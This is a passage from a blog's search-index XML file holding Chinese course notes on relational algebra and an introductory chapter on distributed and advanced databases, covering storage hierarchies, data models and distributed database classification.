–相当于在R×S中选取R和S的所有公共属性值都相等的元组，并在结果中去掉重复属性 θ联接 等值联接 在θ联接中，当θ为等号时，称为“等值联接” 等值联接是θ联接中比较常见的形式 关系代数封闭性 任意关系代数操作的结果仍是一个关系 关系代数的封闭性保证了关系代数操作的可嵌套性 关系代数-删除 例：“从数据库中删除姓名为‘Rose’的学生” Student←Student－σname=‘Rose’(Student) 关系代数-插入 例：插入一个新的学生 S1←S1∪ { (‘001’,’Rose’,19) } 关系代数-修改 例：“将所有男学生的学号前加上字母M” Student←π‘M’||sno,name, sex, age(σsex=‘M’(Student)) ∪ (Student－σsex=‘M’(Student)) 关系代数-查询 例：查询所有状态大于20的供应商的供应商号 ​ 查询供应了London城市中零件的供应商号 查询状态大于20并且没有零件的城市 关系代数与SQL 例： 供应商关系模式：S (S#, SNAME, STATUS, CITY) 求住在同一个城市里的供应商号码对]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式数据库——第一章 高级数据库概述]]></title>
    <url>%2F2019%2F03%2F%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[第一章 高级数据库概述1.数据与存储系统 •存储层次 Register Cache 主存（Main memory） 辅存（Disk） •新型存储体系 2.数据库系统发展 •数据模型 数据结构, 操作 层次, 网状, 关系, OO, 时态, 空间, 图, 时空, 文本, 工程, 生物, 地理, 图像数据库等 •运行环境 集中式, 分布式, 并行,移动, Cluster, Web, 嵌入，云等 •计算方式 被动/主动, 实时数据库 批处理/流处理等 •数据库（DB） 可以存储长时间的信息集合 •数据库管理系统（DBMS） 允许用户使用专门的数据定义语言和操作语言, 支持大数据量数据的长时间存储,并能正确控制多个用户对数据有效存取的软件 3.关系模型与面向对象模型 •概念层 ——直接面对用户 语义表达能力强 易于被用户理解 独立于任何DBMS 易于向逻辑模型转换 •逻辑层 ——数据模型 用户通过DBMS看到的现实世界 传统的DBMS模型：层次，网络，关系模型 新型的DBMS模型：O—O模型，对象—关系模型等 •物理层 ——对用户透明 数据的表示（存储格式） 数据的索引 高效的操作实现 一致性维护及故障处理 •为什么需要OODB 一些数据结构复杂，难于用关系模型描述。 •面向对象模型 —— OO模型 基本概念： 对象标识 OID 对象封装 类和类的嵌套 类和类的继承 持久对象概念 数据模型 用对象与类结构以及类间继承与组合关系建立数据间的复杂结构关系 模式上的操作 用对象与类中方法构作模式上的操作，这种操作语义远强于传统数据模型 OODBMS必须满足两个基本条件 支持核心的面向对象数据模型 支持传统数据库系统所具有的数据库特征 •特化、泛化 •概念模型及其描述工具 E/R 模型：实体—联系模型 –用实体描述对象属性 –用联系描述对象间的语义关系 基于UML的面向对象的模型 （Unified Modeling Language） –静态对象模型 描述对象的属性，关联，聚合，继承，等等 –动态对象模型 描述对象行为，相互作用，合作和变化，等等 –支持概念模型与逻辑模型无缝联接 基于XML的对象模型 –易学，易扩充 –易于快速开发软件 –多个工具可以支持结构转换 4.集中式系统与分布式系统 •分布式数据库系统 定义: 物理上分散而逻辑上集中的数据库系统. 特点 物理分布性 数据不在单个Site上, 按全局需求将数据划分成一定的数据子集, 分散存储在各个Site上 逻辑整体性 各个Site上的数据子集, 相互间有严密的约束规则加以限定, 逻辑上是一个整体 站点自治性 各个Site上的数据(即LDB)是由本地的DBMS管理, 具有自治处理能力 •为什么需要分布式系统 分布为并行执行提供了可能性 复制增加了可用性 •分布式数据库分类 同构型(Homogeneous) 各个Site上的DB数据模型相同 进一步可分为 同构同质型 同构异质型 异构型(Heterogeneous) 各个Site上的DB数据模型不同 集中型 DDB的全局控制信息位于一个中心Sie上 分散型 每个Site上包含有全局控制信息的一个Copy 可变型 DDB分成两组, 一组Site包含全局控制信息Copy(主Site), 另一组不含全局Copy(辅Site)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>分布式</tag>
      </tags>
  </entry>
</search>
